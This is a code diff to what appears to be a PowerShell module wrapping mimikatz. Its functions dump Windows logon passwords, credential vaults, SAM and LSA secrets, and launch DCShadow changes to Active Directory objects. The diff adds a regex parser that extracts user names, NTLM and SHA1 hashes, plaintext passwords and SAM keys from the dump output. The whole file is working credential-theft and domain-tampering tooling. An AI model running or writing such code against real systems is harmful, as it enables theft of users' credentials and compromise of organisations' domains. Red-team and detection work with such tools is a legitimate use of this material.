@@ -1,7 +1,7 @@
 
 
 function Get-MKLogonPassword {
-    mimikatz.exe privilege::debug sekurlsa::logonpasswords exit 
+    mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | ConvertFrom-MKOutput -OutputType LogonPasswords
 }
 
 function Get-MKTicket {
@@ -82,11 +82,11 @@ function Get-MKCredentialVaultCredential {
 }
 
 function Get-MKCredentialVault {
-    mimikatz.exe privilege::debug token::elevate vault::list exit
+    mimikatz.exe privilege::debug token::elevate vault::list exit | ConvertFrom-MKOutput -OutputType VaultList
 }
 
 function Get-MKLsaSam {
-    mimikatz.exe privilege::debug token::elevate lsadump::sam exit
+    mimikatz.exe privilege::debug token::elevate lsadump::sam exit | ConvertFrom-MKOutput -OutputType LsadumpSam
 }
 
 function Get-MKLsaSecret {
@@ -127,7 +127,7 @@ function Invoke-MKDcShadow {
             mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
         }
         else {
-            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value /domain:$Domain`"") -Wait | Out-Null
+            Start-Process -FilePath mimikatz.exe -ArgumentList @("!processtoken", "privilege::debug", "`"lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value`"")
         }
     }
 }
@@ -141,18 +141,27 @@ function Invoke-MKDcShadow {
           [string]$OutputType
       )
 
-      
-      Process {
+      Begin 
+      {
+        $SB = New-Object -Type System.Text.StringBuilder
+      }
 
-      switch($OutputType) {
+      
+      Process 
+      {
+        $SB.AppendLine($Output) | Out-Null
+      }
+
+      End 
+      {
+           switch($OutputType) {
               "LogonPasswords" { $RegEx = '(?:Authentication Id\s+:\s(?<AuthenticationId>.*))[\s\S]*?(?:Session\s+:\s(?<Session>.*))[\s\S]*?(?:User Name\s+:\s(?<UserName>.*))\r*\s*(?:Domain\s+:\s(?<Domain>.*))\r*\s*(?:Logon Server\s+:\s(?<LogonServer>.*))\r*\s*(?:Logon Time\s+:\s(?<LogonTime>.*))\r*\s*(?:SID\s+:\s(?<SID>.*))[\s\S]*?(?:NTLM\s*:\s(?<NTLMHash>.*))?[\s\S]*?(?:SHA1?\s*:\s(?<SHA1Hash>.*))?[\s\S]*?(?:Password\s*:\s(?<Password>.*))'}
               "VaultCred" { $RegEx = '(?:TargetName\s+:\s(?<TargetName>.*))[\s\S]*(?:UserName\s+:\s(?<UserName>.*))[\s\S]*(?:Comment\s+:\s(?<Comment>.*))[\s\S]*(?:Type\s+:\s(?<Type>.*))[\s\S]*(?:Persist\s+:\s(?<Persist>.*))[\s\S]*(?:Flags\s+:\s(?<Flags>.*))[\s\S]*(?:Credential\s+:\s(?<Credential>.*))[\s\S]*(?:Attributes\s+:\s(?<Attributes>.*))'}
               "VaultList" { $RegEx = '(?:Vault\s+:\s(?<Vault>.*))[\s\S]*?(?:\s+Name\s+:\s(?<Name>.*))[\s\S]*?(?:\s+Path\s+:\s(?<Path>.*))' }
               "LsadumpSam" {$RegEx = '(?:Domain\s+:\s(?<Domain>.*))[\s\S]*(?:SysKey\s+:\s(?<SysKey>.*))[\s\S]*(?:Local SID\s+:\s(?<LocalSID>.*))[\s\S]*(?:SAMKey\s+:\s(?<SAMKey>.*))'} 
-          }
+           }
 
-          $Output.ToString() | ConvertTo-Object -Pattern $RegEx
-
+          $SB.ToString() | ConvertTo-Object -Pattern $RegEx
       }
   }
   
